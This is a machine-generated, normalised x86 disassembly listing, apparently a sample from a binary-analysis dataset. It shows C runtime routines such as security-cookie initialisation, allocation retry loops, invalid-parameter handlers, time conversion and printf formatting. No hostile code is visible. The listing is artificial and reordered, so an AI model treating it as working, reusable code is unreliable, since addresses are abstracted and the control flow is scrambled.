call sub_41bf2e
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_41bf48
mov eax [ ebp + 0xc ]
push rw-data
call sub_41dfd0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_411f81
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_41bf15
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_411f81
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_4185dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_418672
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_412584
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_4186b7
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420eff
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_418703
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416ca5
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_418751
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42101d
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_4187a3
push 0x10
push r--data
call sub_4183f0
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_4119bb
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_419fcc
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_418435
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41883d
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_418855
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_412f80
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_421098
pop ecx
sub_41897d
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_417df1
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_421098
pop ecx
pop ebp
jmp sub_418855
pop ebp
jmp eax
sub_4189a3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4211ec
pop ecx
cmp [ eax ] bx
je r-xdata
mov esi [ GetFullPathNameW@IAT ]
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi ebx
ja r-xdata
push ebx
push ebx
push ebx
push eax
call esi
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
jmp r-xdata
mov edi [ ebp + 0x10 ]
cmp edi eax
ja r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4119e1
xor eax eax
jmp r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x7fffffff
jbe r-xdata
mov edi eax
pop ecx
mov eax [ ebp - 0x4 ]
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
call sub_4119bb
mov [ eax ] 0x22
jmp r-xdata
push [ ebp - 0x4 ]
call sub_4121b5
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x2
push edi
call sub_41d208
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
call sub_4119bb
mov [ eax ] 0x16
push [ ebp - 0x4 ]
call sub_4121b5
pop ecx
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push edi
push [ ebp + 0xc ]
call esi
cmp eax edi
jb r-xdata
call sub_4119bb
mov [ eax ] 0xc
jmp r-xdata
sub_418ab1
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
cmp [ esi + 0x2 ] 0x3a
push edi
mov ecx esi
jne r-xdata
movzx edx [ ecx ]
cmp dx 0x5c
je r-xdata
lea ecx [ esi + 0x4 ]
cmp [ ecx + 0x2 ] 0x0
je r-xdata
cmp dx 0x2f
jne r-xdata
mov edi 0x4040
test al 0x10
jne r-xdata
mov eax edi
shr eax 0x3
and eax 0x38
or edi eax
mov eax edi
shr eax 0x6
and eax 0x7
or eax edi
pop edi
pop esi
pop ebp
retn
push r--data
push esi
call sub_421346
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi 0x8000
test dx dx
jne r-xdata
or edi 0x40
push r--data
push esi
call sub_421346
pop ecx
pop ecx
test eax eax
je r-xdata
shl eax 0x7
not eax
and eax 0x80
or eax 0x100
push 0x2e
push esi
or edi eax
call sub_41194d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push r--data
push esi
call sub_421346
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push esi
call sub_421346
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_418b74
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
add esi 0xfffff894
cmp esi 0x46
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] eax
jl r-xdata
call sub_4119bb
mov [ eax ] 0x16
or eax 0xffffffff
or edx eax
cmp esi 0x44c
jg r-xdata
mov ebx [ ebp + 0xc ]
lea eax [ ebx - 0x1 ]
cmp eax 0xb
ja r-xdata
cmp [ ebp + 0x14 ] 0x17
ja r-xdata
cmp [ ebp + 0x18 ] 0x3b
ja r-xdata
cmp [ ebp + 0x1c ] 0x3b
ja r-xdata
cmp [ ebp + 0x10 ] 0x1
jl r-xdata
lea eax [ ebx * 4 + rw-data ]
mov ecx [ eax - 0x4 ]
mov eax [ eax ]
sub eax ecx
cmp eax [ ebp + 0x10 ]
mov edi 0x190
jge r-xdata
mov eax [ ebp + 0x10 ]
add ecx eax
mov eax esi
and eax 0x80000003
mov [ ebp + 0x8 ] ecx
jns r-xdata
mov eax esi
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ esi + 0x76c ]
cdq
mov ecx edi
idiv ecx
test edx edx
jne r-xdata
mov eax esi
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
lea eax [ esi + 0x76c ]
cdq
mov ebx edi
idiv ebx
test edx edx
jne r-xdata
mov eax esi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ esi + 0x12b ]
cdq
idiv edi
lea ecx [ esi - 0x1 ]
push 0x64
pop ebx
push 0x0
push 0x16d
mov edi eax
mov eax ecx
cdq
idiv ebx
sub edi eax
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ edi + eax - 0x11 ]
cdq
mov ebx eax
mov eax edx
mov [ ebp - 0x10 ] eax
mov eax esi
cdq
sub eax 0x46
sbb edx 0x0
push edx
push eax
call sub_421c80
add ebx eax
mov eax [ ebp - 0x10 ]
adc eax edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
cdq
add ebx eax
mov eax [ ebp - 0x10 ]
adc eax edx
xor edi edi
push edi
push 0x18
push eax
push ebx
call sub_421c80
mov ecx eax
mov eax [ ebp + 0x14 ]
mov ebx edx
cdq
push edi
add ecx eax
push 0x3c
adc ebx edx
push ebx
push ecx
call sub_421c80
mov ecx eax
mov eax [ ebp + 0x18 ]
mov ebx edx
cdq
push edi
add ecx eax
push 0x3c
adc ebx edx
push ebx
push ecx
call sub_421c80
mov edi eax
mov eax [ ebp + 0x1c ]
mov ebx edx
cdq
add edi eax
adc ebx edx
call sub_421b21
lea eax [ ebp - 0x8 ]
push eax
call sub_421bb1
pop ecx
test eax eax
je r-xdata
cmp ebx 0x2
jle r-xdata
mov ebx [ ebp + 0xc ]
cmp ebx 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_421bea
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_418855
add esp 0x14
inc [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] 0x1d
jg r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_421c23
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_418855
add esp 0x14
mov eax [ ebp - 0x4 ]
cdq
add edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
adc ebx edx
dec eax
cmp [ ebp + 0x20 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x34 ] eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_418855
add esp 0x14
mov eax [ ebp - 0xc ]
cdq
add edi eax
adc ebx edx
cmp [ ebp + 0x20 ] 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax edi
mov edx ebx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
call sub_421b70
pop ecx
test eax eax
je r-xdata
sub_418ddf
mov edi edi
push ebp
mov ebp esp
sub esp 0x114
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x110 ] 0x0
push ebx
push esi
push edi
mov edi [ GetCurrentDirectoryA@IAT ]
lea ebx [ ebp - 0x10c ]
mov eax ebx
push eax
push 0x105
call edi
mov esi eax
cmp esi 0x104
jle r-xdata
xor edi edi
test esi esi
je r-xdata
lea eax [ esi + 0x1 ]
push 0x1
push eax
mov [ ebp - 0x114 ] eax
call sub_4186b7
mov ebx eax
pop ecx
pop ecx
test ebx ebx
jne r-xdata
call sub_4119bb
mov [ eax ] 0xc
cmp [ ebx + 0x1 ] 0x3a
jne r-xdata
mov [ ebp - 0x110 ] 0x1
test esi esi
je r-xdata
call sub_4119bb
mov [ eax ] 0xc
xor esi esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
push ebx
call sub_4121b5
pop ecx
cmp [ ebp - 0x110 ] 0x0
je r-xdata
movzx eax [ ebx ]
push eax
call sub_421dca
mov edi eax
pop ecx
sub edi 0x40
jmp r-xdata
push ebx
push [ ebp - 0x114 ]
call edi
mov esi eax
sub_418ea8
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_415547
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_42029f
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_42000d
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_418f73
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_421098
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_421098
pop ecx
sub_419079
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_41b3c1
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_4119bb
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_4119bb
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_41360f
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_41e7c0
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_421df6
pop ecx
test eax eax
jne r-xdata
call sub_41360f
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_41e7c0
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_420bd9
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_4203d1
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_4191dd
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_421e5a
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_41920c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
dec [ ebp + 0xc ]
call sub_4191dd
cmp [ esi ] 0xffffffff
pop ecx
je r-xdata
pop esi
pop ebp
retn
sub_419233
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
movzx eax [ ebx ]
dec [ ebp + 0x8 ]
push eax
mov eax edi
call sub_4191dd
inc ebx
inc ebx
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_4119bb
cmp [ eax ] 0x2a
jne r-xdata
push 0x3f
mov eax edi
call sub_4191dd
pop ecx
sub_419285
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
xor edi edi
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x448 ] edi
mov [ ebp - 0x408 ] edi
mov [ ebp - 0x42c ] edi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] edi
mov [ ebp - 0x43c ] edi
mov [ ebp - 0x428 ] edi
call sub_415547
cmp [ ebp - 0x430 ] edi
jne r-xdata
cmp esi edi
je r-xdata
call sub_4119bb
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
movzx edx [ esi ]
xor ecx ecx
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x414 ] edi
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x418 ] edx
cmp dx di
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop edi
add esi edi
cmp [ ebp - 0x420 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
mov eax [ ebp - 0x420 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax dx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x418 ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_419dfd ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x45c ] eax
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x45c ]
mov ebx [ ebp - 0x41c ]
mov edx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x43c ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax dx
sub eax 0x20
je r-xdata
cmp dx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp dx 0x2a
jne r-xdata
movzx eax dx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x430 ]
push edx
lea esi [ ebp - 0x420 ]
mov [ ebp - 0x428 ] 0x1
call sub_4191dd
jmp r-xdata
movzx eax dx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] edi
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x42c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x42c ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x42c ] ebx
test ebx ebx
jge r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x40c ] ebx
test ebx ebx
jge r-xdata
movzx eax [ esi ]
cmp ax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x42c ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp ax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax edi
je r-xdata
cmp ax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov edi [ ebp - 0x40c ]
cmp edi 0xffffffff
jne r-xdata
sub eax edi
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test [ ebp - 0x408 ] 0x1000
jne r-xdata
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
add ebx 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp ax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi edi
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x410 ] ebx
je r-xdata
mov edi 0x7fffffff
mov [ ebp - 0x418 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x418 ] 0x10
je r-xdata
cmp [ ebp - 0x43c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
je r-xdata
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x448 ] ecx
jmp r-xdata
sub eax edi
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp ax 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x448 ] 0x27
test [ ebp - 0x408 ] 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x438 ] ax
mov eax [ ebp - 0x448 ]
add eax 0x51
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x424 ] edi
jmp r-xdata
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea esi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] esi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
